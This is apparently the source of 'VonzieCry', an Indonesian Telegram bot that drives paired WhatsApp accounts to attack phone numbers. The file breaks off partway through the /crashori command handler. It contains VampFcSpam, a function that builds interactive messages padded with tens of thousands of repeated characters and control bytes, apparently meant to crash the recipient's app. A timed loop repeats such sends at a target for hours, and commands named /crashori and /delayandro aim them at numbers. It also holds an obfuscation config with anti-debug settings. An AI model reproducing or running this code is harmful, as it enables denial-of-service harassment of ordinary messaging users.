const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const pino = require("pino");
const crypto = require("crypto");
const renlol = fs.readFileSync('./lib/thumb.jpeg');
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const cd = "cooldown.json";
const axios = require("axios");
const chalk = require("chalk");
const randomColor = require("randomcolor");
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const OWNER_ID = config.OWNER_ID;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const ONLY_FILE = "./data/only.json";
const ownerId = ["6217597836"]; // <- masukkan ID kamu di sini
// Delay
const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));


function isOnlyGroupEnabled() {
  const config = JSON.parse(fs.readFileSync(ONLY_FILE));
  return config.onlyGroup;
}

function setOnlyGroup(status) {
  const config = { onlyGroup: status };
  fs.writeFileSync(ONLY_FILE, JSON.stringify(config, null, 2));
}

function shouldIgnoreMessage(msg) {
  if (!isOnlyGroupEnabled()) return false;
  return msg.chat.type === "private";
}

let premiumUsers = JSON.parse(fs.readFileSync('./data/premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./data/admin.json'));

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./data/premium.json');
ensureFileExists('./data/admin.json');


function savePremiumUsers() {
    fs.writeFileSync('./data/premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./data/admin.json', JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./data/premium.json', (data) => (premiumUsers = data));
watchFile('./data/admin.json', (data) => (adminUsers = data));

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/xyucode15/Evodb/refs/heads/main/tokendbevo.json";

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    if (Array.isArray(response.data)) {
      return response.data; // langsung array
    } else {
      console.error(chalk.red("❌ Format data di GitHub salah! Harus array token"));
      return [];
    }
  } catch (error) {
    console.error(chalk.red("OPSS TOKEN MU GADA DI DATABASE NI\n Minta Access Ke @BangZyur :", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.green("🔎 VonzieCry Sedang Mengecek Token Bot Mu..."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("❌ Token bot Mu Gagal Diproses Oleh VonzieCry"));
    process.exit(1);
  }

  console.log(chalk.green("Success Detect Token Mu ... Anda Bisa Access VonzieCry Kali Ini"));
  startBot();
}

function startBot() {
  console.log(chalk.red(`Welcome To Script VonzieCry !! 
`));


console.log(chalk.bold.blue(`
VonzieCry Is Back
`));

console.log(chalk.blue(`
------  Login Diterima  ------
`));
};

let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket ({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `<b>𝙿𝚁𝙾𝚂𝙴𝚂 𝙿𝙰𝙸𝚁𝙸𝙽𝙶 𝙱𝙰𝙽𝙶  ${botNumber}.....<b>
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `<b>otw proses ni ${botNumber}.....<b>
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
<b>upss eror nich, laporin ke dep  ${botNumber}.....<b>
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `<b>Code Pairing ${botNumber}.....<b>
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
<b>𝙺𝙴𝙻𝙰𝚉𝚉 𝚂𝚄𝙺𝚂𝙴𝚂 𝙿𝙰𝙸𝚁𝙸𝙽𝙶<b>
𝙲𝙾𝙳𝙴 𝙴𝙽𝚃𝙴 : ${formattedCode}`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
<b>Gagal Pairing ${botNumber}.....<b>`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}





// -------( Fungsional Function Before Parameters )--------- \\
// ~Bukan gpt ya kontol

//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); 
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); 
}


function getRandomImage() {
  const images = [
        "https://files.catbox.moe/7pnt5o.jpg",
        "https://files.catbox.moe/7pnt5o.jpg",
        "https://files.catbox.moe/e0oj7s.jpg", 
  "https://files.catbox.moe/e0oj7s.jpg"    
  ];
  return images[Math.floor(Math.random() * images.length)];
}

// ~ Coldowwn

let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000); 
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(user => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `Ya - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "Tidak - Tidak ada waktu aktif";
  }
}

async function getWhatsAppChannelInfo(link) {
    if (!link.includes("https://whatsapp.com/channel/")) return { error: "Link tidak valid!" };
    
    let channelId = link.split("https://whatsapp.com/channel/")[1];
    try {
        let res = await sock.newsletterMetadata("invite", channelId);
        return {
            id: res.id,
            name: res.name,
            subscribers: res.subscribers,
            status: res.state,
            verified: res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"
        };
    } catch (err) {
        return { error: "Gagal mengambil data! Pastikan channel valid." };
    }
}

// ~ Enc
const getAphocalypsObfuscationConfig = () => {
    const generateSiuCalcrickName = () => {
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        let randomPart = "";
        for (let i = 0; i < 6; i++) { // 6 karakter untuk keseimbangan
            randomPart += chars[Math.floor(Math.random() * chars.length)];
        }
        return `xᴀᴛᴀ和ɢᴀɴᴛᴇɴɢ无sᴀɴɢᴀᴛ气${randomPart}`;
    };

    return {
    target: "node",
    compact: true,
    renameVariables: true,
    renameGlobals: true,
    identifierGenerator: generateSiuCalcrickName,
    stringCompression: true,       
        stringEncoding: true,           
        stringSplitting: true,      
    controlFlowFlattening: 0.95,
    shuffle: true,
        rgf: false,
        flatten: true,
    duplicateLiteralsRemoval: true,
    deadCode: true,
    calculator: true,
    opaquePredicates: true,
    lock: {
        selfDefending: true,
        antiDebug: true,
        integrity: true,
        tamperProtection: true
        }
    };
};

// #Progres #1
const createProgressBar = (percentage) => {
    const total = 10;
    const filled = Math.round((percentage / 100) * total);
    return "▰".repeat(filled) + "▱".repeat(total - filled);
};

// ~ Update Progress 
// Fix `updateProgress()`
async function updateProgress(bot, chatId, message, percentage, status) {
    if (!bot || !chatId || !message || !message.message_id) {
        console.error("updateProgress: Bot, chatId, atau message tidak valid");
        return;
    }

    const bar = createProgressBar(percentage);
    const levelText = percentage === 100 ? "✅ Selesai" : `⚙️ ${status}`;
    
    try {
        await bot.editMessageText(
            "```css\n" +
            "🔒 EncryptBot\n" +
            ` ${levelText} (${percentage}%)\n` +
            ` ${bar}\n` +
            "```\n" +
            "_© 𝙴𝙽𝙲 𝙱𝙾𝚃 𝚉𝙴𝚁𝙾_",
            {
                chat_id: chatId,
                message_id: message.message_id,
                parse_mode: "Markdown"
            }
        );
        await new Promise(resolve => setTimeout(resolve, Math.min(800, percentage * 8)));
    } catch (error) {
        console.error("Gagal memperbarui progres:", error.message);
    }
}

const venomModsData = JSON.stringify({
  status: true,
  criador: "Vampire",
  resultado: {
    type: "md",
    ws: {
      _events: {
        "CB:ib,,dirty": ["Array"]
      },
      _eventsCount: 80000,
      _maxListeners: 0,
      url: "wss://web.whatsapp.com/ws/chat",
      config: {
        version: ["Array"],
        browser: ["Array"],
        waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
        sockCectTimeoutMs: 2000,
        keepAliveIntervalMs: 30000,
        logger: {},
        printQRInTerminal: false,
        emitOwnEvents: true,
        defaultQueryTimeoutMs: 6000,
        customUploadHosts: [],
        retryRequestDelayMs: 250,
        maxMsgRetryCount: 5,
        fireInitQueries: true,
        auth: { Object: "authData" },
        markOnlineOnsockCect: true,
        syncFullHistory: true,
        linkPreviewImageThumbnailWidth: 192,
        transactionOpts: { Object: "transactionOptsData" },
        generateHighQualityLinkPreview: false,
        options: {},
        appStateMacVerification: { Object: "appStateMacData" },
        mobile: true
      }
    }
  }
});

async function VampFcSpam(target) {
    sock.relayMessage(
        target,
        {
            interactiveMessage: {
                header: {
                    title: "𝚡𝚊𝚝𝚊𝚗𝚒𝚌𝚊𝚕",
                    hasMediaAttachment: false
                },
                body: {
                    text: "ꦾ".repeat(90000) + "@8".repeat(90000),
                },
                nativeFlowMessage: {
                    messageParamsJson: "",
                    buttons: [
                        { name: "single_select", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "payment_method", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "call_permission_request", buttonParamsJson: venomModsData + "\u0003".repeat(9999), voice_call: "call_galaxy" },
                        { name: "form_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "wa_payment_learn_more", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "wa_payment_transaction_details", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "wa_payment_fbpin_reset", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "catalog_message", buttonParamsJson: venomModsData + "\u0003".repeat(9999) },
                        { name: "cta_call", buttonParamsJson: venomModsData + "\u0003".repeat(9999) }
                    ]
                }
            }
        },
        { participant: { jid: target } }
    );
}

// ---------( The Bug Function)---------
Function Mu

////////// Batas Function //////////////

async function thexevo(durationHours, target) { 
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;
const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
    
const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 565) {
            await Promise.all([
            await functionmu(sock, target), 
            ]);
            console.log(chalk.red(`{VonzieCry}{FORCE} ${count}/222 to ${target}`));
            count++;
            setTimeout(sendNext, 100);
        } else {
            console.log(chalk.green(`✅ Success Sending 555 Messages to ${target}`));
            count = 0;
            console.log(chalk.red("➡️ Next 555 Messages"));
            setTimeout(sendNext, 100);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        

        setTimeout(sendNext, 100);
    }
};

sendNext();

}

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}


const bugRequests = {};
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);
  const runtime = getBotRuntime();
  const randomImage = getRandomImage();
  
  if (shouldIgnoreMessage(msg)) return;

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `<b>OPPSSS !!! <b>
<b>/regis <ɪᴅ ᴛᴇʟᴇ> sɪʟᴀʜᴋᴀɴ ʀᴇɢɪs ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ ᴀɢᴀʀ ʙɪsᴀ ᴀᴄᴄᴇss sᴄʀɪᴘᴛ.<b>
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Developer", url: "https://t.me/BangZyur" }]]
      }
    });
  }

  bot.sendPhoto(chatId, "https://files.catbox.moe/7pnt5o.jpg", {
    caption: `
<b>Holla ${username} !!,let me introduce myself, I am VonzieCry, specially designed by @BangZyur, I was invited to eradicate pests. <b>

<b>─ don't use bots if it's not important, be wise in using this bug bot<b>

<b>╭━━ 『 vonziecry 』<b>
<b>┃◇ ᴅᴇᴠᴇʟᴏᴘᴇʀ  : @BangZyur <b>
<b>┃◇ ɢᴇɴ : 0.0.0<b>
<b>┃◇ ʀᴜɴᴛɪᴍᴇ : ${runtime}<b>
<b>┃◇ ᴜsᴇʀ : ${username}<b>
<b>┃◇ ᴜsᴇʀ ɪᴅ : ${senderId}<b>
<b>┃◇ sᴛᴀᴛᴜs : ${premiumStatus}<b>
<b>╰━━━━━━━━━━━━━━━━━━◆<b>
<b>╭━━━━━━━━━━━━━━━━━━◆<b>
<b>┃◇ Jangan Terlalu Mencintai Seseorang Karna Cinta Berawal Tidak Dari Ketulusan Tapi Dari Ketampanan<b>
<b>╰━━━━━━━━━━━━━━━━━━◆<b>
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "ᴏᴛʜᴇʀ ᴍᴇɴᴜ", callback_data: "settings" }, 
        { text: "ᴏᴡɴᴇʀ ᴍᴇɴᴜ", callback_data: "ownermenu" }],
        [{ text: "xvonziecry", callback_data: "vonziemenu" }]
      ]
    }
  });
});

bot.on("callback_query", async (query) => {
  try {
      await bot.answerCallbackQuery(query.id);
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
    const senderId = query.from.id;
    const runtime = getBotRuntime();
    const premiumStatus = getPremiumStatus(query.from.id);
    const randomImage = getRandomImage();

    let caption = "";
    let replyMarkup = {};

    if (query.data === "vonziemenu") {
      caption = `<b>Holla ${username} !!,let me introduce myself, I am VonzieCry, specially designed by @BangZyur, I was invited to eradicate pests. <b>

<b>─ don't use bots if it's not important, be wise in using this bug bot<b>

<b>╭━━ 『 vonziecry 』<b>
<b>┃◇ ᴅᴇᴠᴇʟᴏᴘᴇʀ  : @BangZyur <b>
<b>┃◇ ɢᴇɴ : 0.0.0<b>
<b>┃◇ ʀᴜɴᴛɪᴍᴇ : ${runtime}<b>
<b>┃◇ ᴜsᴇʀ : ${username}<b>
<b>┃◇ ᴜsᴇʀ ɪᴅ : ${senderId}<b>
<b>┃◇ sᴛᴀᴛᴜs : ${premiumStatus}<b>
<b>╰━━━━━━━━━━━━━━━━━━◆<b>
<b>╭━━━━━━━━━━━━━━━━━━◆<b>
<b>┃◇ Jangan Terlalu Mencintai Seseorang Karna Cinta Berawal Tidak Dari Ketulusan Tapi Dari Ketampanan<b>
<b>╰━━━━━━━━━━━━━━━━━━◆<b>

<b>╭━━━ 『 vonziecry ᴛʏᴘᴇ 』━━━◆<b>
<b>┃◇ /crashori 62×× <b>
<b>┃◇ /delayandro 62×× <b>
<b>┃◇ /evopair 62×× <b>
<b>╰━━━━━━━━━━━━━━━◆<b>

`,
      replyMarkup = { inline_keyboard: [[{ text: "🔙 Kembali", callback_data: "back_to_main" }]] };
    }
    
    if (query.data === "settings") {
      caption = `<b>Holla ${username} !!,let me introduce myself, I am VonzieCry, specially designed by @BangZyur, I was invited to eradicate pests. <b>

<b>─ don't use bots if it's not important, be wise in using this bug bot<b>

<b>╭━━ 『 vonziecry 』<b>
<b>┃◇ ᴅᴇᴠᴇʟᴏᴘᴇʀ  : @BangZyur <b>
<b>┃◇ ɢᴇɴ : 0.0.0<b>
<b>┃◇ ʀᴜɴᴛɪᴍᴇ : ${runtime}<b>
<b>┃◇ ᴜsᴇʀ : ${username}<b>
<b>┃◇ ᴜsᴇʀ ɪᴅ : ${senderId}<b>
<b>┃◇ sᴛᴀᴛᴜs : ${premiumStatus}<b>
<b>╰━━━━━━━━━━━━━━━━━━◆<b>
<b>╭━━━━━━━━━━━━━━━━━━◆<b>
<b>┃◇ Jangan Terlalu Mencintai Seseorang Karna Cinta Berawal Tidak Dari Ketulusan Tapi Dari Ketampanan<b>
<b>╰━━━━━━━━━━━━━━━━━━◆<b>

<b>╭━『 ᴏᴛʜᴇʀ ᴍᴇɴᴜ 』<b>
<b>┃◇ /sᴇᴛᴊᴇᴅᴀ <5ᴍ><b>
<b>┃◇ /ʀᴇɢɪs <ɪᴅ><b>
<b>┃◇ /ᴅᴇʟʀᴇɢɪs <ɪᴅ><b>
<b>┃◇ /ʟɪsᴛʀᴇɢɪs<b>
<b>┃◇ /ᴀᴅᴅᴀᴅᴍɪɴ <ɪᴅ><b>
<b>┃◇ /ʀᴇǫᴘᴀɪʀ 62×××<b>
<b>┃◇ /ɢʀᴏᴜᴘᴏɴʟʏ <ᴏɴ><b>
<b>┃◇ /ᴇɴᴄᴊᴀᴠᴀ<b>
<b>┃◇ /ᴄᴇᴋɪᴅᴄʜ <ʟɪɴᴋ><b>
<b>╰━━━━━━━━━━━━━━━━━━◆<b>
`,
      replyMarkup = { inline_keyboard: [[{ text: "🔙 Kembali", callback_data: "back_to_main" }]] };
    }

    if (query.data === "ownermenu") {
      caption = `<b>Holla ${username} !!,let me introduce myself, I am VonzieCry, specially designed by @BangZyur, I was invited to eradicate pests. <b>

<b>─ don't use bots if it's not important, be wise in using this bug bot<b>

<b>╭━━ 『 vonziecry 』<b>
<b>┃◇ ᴅᴇᴠᴇʟᴏᴘᴇʀ  : @BangZyur <b>
<b>┃◇ ɢᴇɴ : 0.0.0<b>
<b>┃◇ ʀᴜɴᴛɪᴍᴇ : ${runtime}<b>
<b>┃◇ ᴜsᴇʀ : ${username}<b>
<b>┃◇ ᴜsᴇʀ ɪᴅ : ${senderId}<b>
<b>┃◇ sᴛᴀᴛᴜs : ${premiumStatus}<b>
<b>╰━━━━━━━━━━━━━━━━━━◆<b>
<b>╭━━━━━━━━━━━━━━━━━━◆<b>
<b>┃◇ Jangan Terlalu Mencintai Seseorang Karna Cinta Berawal Tidak Dari Ketulusan Tapi Dari Ketampanan<b>
<b>╰━━━━━━━━━━━━━━━━━━◆<b>

<b>╭━ 『 ᴏᴡɴᴇʀ ᴍᴇɴᴜ 』<b>
<b>┃◇ /ᴀᴅᴅᴀᴅᴍɪɴ <ɪᴅ><b>
<b>┃◇ /ᴅᴇʟᴀᴅᴍɪɴ <ɪᴅ><b>
<b>╰━━━━━━━━━━━━━━━━━━◆<b>
`,
      replyMarkup = { inline_keyboard: [[{ text: "🔙 Kembali", callback_data: "back_to_main" }]] };
    }

    if (query.data === "back_to_main") {
      caption = `<b>Holla ${username} !!,let me introduce myself, I am VonzieCry, specially designed by @BangZyur, I was invited to eradicate pests. <b>

<b>─ don't use bots if it's not important, be wise in using this bug bot<b>

<b>╭━━ 『 vonziecry 』<b>
<b>┃◇ ᴅᴇᴠᴇʟᴏᴘᴇʀ  : @BangZyur <b>
<b>┃◇ ɢᴇɴ : 0.0.0<b>
<b>┃◇ ʀᴜɴᴛɪᴍᴇ : ${runtime}<b>
<b>┃◇ ᴜsᴇʀ : ${username}<b>
<b>┃◇ ᴜsᴇʀ ɪᴅ : ${senderId}<b>
<b>┃◇ sᴛᴀᴛᴜs : ${premiumStatus}<b>
<b>╰━━━━━━━━━━━━━━━━━━◆<b>
<b>╭━━━━━━━━━━━━━━━━━━◆<b>
<b>┃◇ Jangan Terlalu Mencintai Seseorang Karna Cinta Berawal Tidak Dari Ketulusan Tapi Dari Ketampanan<b>
<b>╰━━━━━━━━━━━━━━━━━━◆<b>


╭━ 『 ᴛʜᴀɴᴋs ᴛᴏ 』
┃◇ 𝚁𝚈𝚉𝚉𝚇𝙰𝙹𝙰 [ ᴅᴇᴠ ]
┃◇ 𝚃𝙰𝚃𝙰𝙰 [ ᴍʏ ɢғ ]
┃◇ 𝚇𝚈𝚄𝚄 [ ʙᴇsᴛ ғʀɪᴇɴᴅs ]
┃◇ 𝙷𝙾𝙺𝙼𝙰 [ ʙᴇsᴛ ғʀɪᴇɴᴅs ]
┃◇ 𝚁𝙴𝙽𝙽𝙰 [ ʙᴇsᴛ ғʀɪᴇɴᴅs ]
┃◇ 𝚁𝙴𝚉𝙰 [ ʙᴇsᴛ ғʀɪᴇɴᴅs ]
┃◇ 𝚅𝙴𝚇𝚇𝚄𝚉𝚉 [ ʙᴇsᴛ ғʀɪᴇɴᴅs ]
┃◇ 𝚅𝙴𝚉𝚇𝙴𝙲 [ ʙᴇsᴛ ғʀɪᴇɴᴅs ]
┃◇ 𝙺𝙴𝚅𝚅 [ ʙᴇsᴛ ᴘᴀʀᴛɴᴇʀ ]
┃◇ 𝚉𝚈𝙽𝚉𝚉 [ ᴘᴀʀᴛɴᴇʀ ]
┃◇ 𝙸𝚀𝙱𝙰𝙻 [ ᴘᴀʀᴛɴᴇʀ ]
┃◇ 𝚉𝙴𝙽𝙸𝚇𝚂 [ ᴘᴀʀᴛɴᴇʀ ]
┃◇ 𝙼𝙸𝚉𝚄𝚄 [ ᴘᴀʀᴛɴᴇʀ ]
┃◇ 𝙸𝙺𝙺𝚈 [ ᴘᴀʀᴛɴᴇʀ ]
┃◇ 𝚂𝙰𝚁𝚇𝚇 [ ᴘᴀʀᴛɴᴇʀ ]
┃◇ 𝙴𝙻𝙴𝚅 [ sᴜᴘᴘᴏʀᴛ ]
┃◇ 𝙼𝙰𝙻𝙻𝚂𝚂 [ sᴜᴘᴘᴏʀᴛ ]
┃◇ 𝙴𝙻𝙻 [ sᴜᴘᴘᴏʀᴛ ]
┃◇ 𝙰𝙻𝙻 𝙿𝙴𝙽𝙶𝙶𝚄𝙽𝙰 𝚂𝙲 𝙴𝚅𝙾𝚄𝚁𝚃𝙷
╰━━━━━━━━━━━━━━━◆
`,
      replyMarkup = {
        inline_keyboard: [
        [{ text: "sᴇᴛᴛɪɴɢ", callback_data: "setting" }, { text: "ᴏwɴᴇʀ", callback_data: "ownermenu" }],
        [{ text: "xvonziecry", callback_data: "vonziemenu" }]
      ]
      };
    }

    await bot.editMessageMedia(
      {
        type: "video",
        media: "https://files.catbox.moe/e0oj7s.jpg",
        caption: caption,
        parse_mode: "Markdown"
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup
      }
    );

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
});

//=======CASE BUG=========//

bot.onText(/\/crashori (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

if (shouldIgnoreMessage(msg)) return;
 

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `<b>KAMU TIDAK MEMILIKI AKSES<b>
( ! ) Silahkan Registrasi Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Developer", url: "t.me/BangZyur" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
